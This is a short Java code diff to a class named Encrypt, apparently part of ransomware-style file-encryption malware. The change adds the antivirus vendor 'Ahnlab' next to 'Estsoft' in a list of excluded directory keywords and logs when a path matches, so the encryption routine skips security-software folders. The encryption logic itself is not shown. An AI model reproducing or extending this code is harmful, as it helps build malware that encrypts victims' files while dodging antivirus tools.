@@ -30,7 +30,8 @@ public class Encrypt {
             "C:\\Program Files (x86)"
     };
     private static final String[] EXCLUDED_KEYWORDS = {
-            "Estsoft"
+            "Estsoft",
+            "Ahnlab"
     };
 
     public static void runEncryption() {
@@ -72,6 +73,7 @@ public class Encrypt {
 
         for (String keyword : EXCLUDED_KEYWORDS) {
             if (dirPath.toLowerCase().contains(keyword.toLowerCase())) {
+                System.out.println("AntiVirus(Ahnlab) = " + dirPath);
                 return;
             }
         }
